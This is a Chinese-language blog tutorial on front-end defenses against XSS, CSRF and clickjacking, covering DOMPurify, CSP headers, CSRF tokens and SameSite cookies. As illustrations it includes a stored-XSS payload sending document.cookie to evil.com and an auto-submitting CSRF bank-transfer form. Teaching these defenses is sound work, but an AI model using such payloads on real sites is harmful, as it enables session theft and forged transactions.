---
title: "前端安全：XSS、CSRF 完整防禦方案"
date: 2019-07-26 10:36:28
tags:
  - 安全
readingTime: 2
description: "安全是後端的事？大錯特錯。很多 XSS 和 CSRF 漏洞是前端程式碼造成的，防禦也要前端配合。"
wordCount: 204
---

安全是後端的事？大錯特錯。很多 XSS 和 CSRF 漏洞是前端程式碼造成的，防禦也要前端配合。

## XSS（跨站指令碼攻擊）

攻擊者在頁面注入惡意指令碼，在使用者瀏覽器執行。

### 型別

```javascript
// 1. 儲存型 XSS：惡意內容存入資料庫
// 使用者提交：<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
// 後端儲存，其他使用者訪問時執行

// 2. 反射型 XSS：通過 URL 引數注入
// https://example.com/search?q=<script>alert(1)</script>
// 後端直接把 q 引數輸出到 HTML

// 3. DOM 型 XSS：不經過伺服器
// document.getElementById('content').innerHTML = location.hash  // 危險！
```

### 防禦

```javascript
{% raw %}
// ❌ 危險：直接使用使用者輸入
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);

// ✅ 安全：使用 textContent
element.textContent = userInput; // 自動轉義，不解析 HTML

// ✅ 安全：需要富文本時，使用白名單過濾庫
import DOMPurify from "dompurify";
element.innerHTML = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
  ALLOWED_ATTR: ["href", "target", "rel"],
});

// React/Vue 的 XSS 保護
// React：JSX 預設轉義，dangerouslySetInnerHTML 才有風險
// Vue：{{ }} 預設轉義，v-html 才有風險

// URL 引數用 encodeURIComponent
const url = `https://api.example.com/search?q=${encodeURIComponent(query)}`;
{% endraw %}
```

### Content Security Policy（CSP）

```html
<!-- 最強防禦：瀏覽器級別的策略 -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline';"
/>
```

```nginx
# 更好：通過 HTTP 響應頭配置
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  img-src 'self' data: https:;
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
" always;
```

## CSRF（跨站請求偽造）

攻擊者讓已登入使用者在不知情的情況下發起惡意請求。

```html
<!-- 攻擊頁面（evil.com）：使用者訪問這個頁面就自動發起轉賬請求 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" />
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="hacker" />
  <input name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

### CSRF Token 防禦

```javascript
// 後端：生成隨機 token 放入 Cookie 或隱藏表單欄位
// 前端：每次請求攜帶 token

// axios 攔截器：自動新增 CSRF token
axios.interceptors.request.use((config) => {
  // 從 Cookie 讀取 CSRF token（雙重提交 Cookie 方案）
  const csrfToken = getCookie("csrf_token");
  if (csrfToken) {
    config.headers["X-CSRF-Token"] = csrfToken;
  }
  return config;
});
```

### SameSite Cookie

```javascript
// 後端設定 Cookie 的 SameSite 屬性
// Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly

// Strict：完全禁止第三方 Cookie（來自其他域的請求不帶 Cookie）
// Lax：大部分場景禁止，GET 導航除外（預設值）
// None：允許（需要 Secure）
```

SameSite=Lax 已經是現代瀏覽器的預設值，大大降低了 CSRF 風險。

## 點選劫持（Clickjacking）

```nginx
# 禁止頁面被 iframe 嵌入
add_header X-Frame-Options "DENY" always;
# 或 CSP
add_header Content-Security-Policy "frame-ancestors 'none';" always;
```

## 安全檢查清單

```
□ 不直接 innerHTML 使用者輸入，用 DOMPurify 過濾富文本
□ v-html / dangerouslySetInnerHTML 只用於可信內容
□ API 請求新增 CSRF Token 或依賴 SameSite Cookie
□ 設定 CSP 響應頭
□ 設定 X-Frame-Options 防止點選劫持
□ Token 存 HttpOnly Cookie，不存 localStorage（防 XSS 偷取）
□ 敏感操作二次驗證（密碼、手機驗證碼）
□ npm audit 檢查依賴漏洞
```

## 小結

- XSS：用 `textContent` 代替 `innerHTML`，富文本用白名單過濾，配置 CSP
- CSRF：SameSite Cookie + CSRF Token，現代瀏覽器已較好防禦
- 安全不是"後端的事"，前端程式碼同樣可能引入漏洞
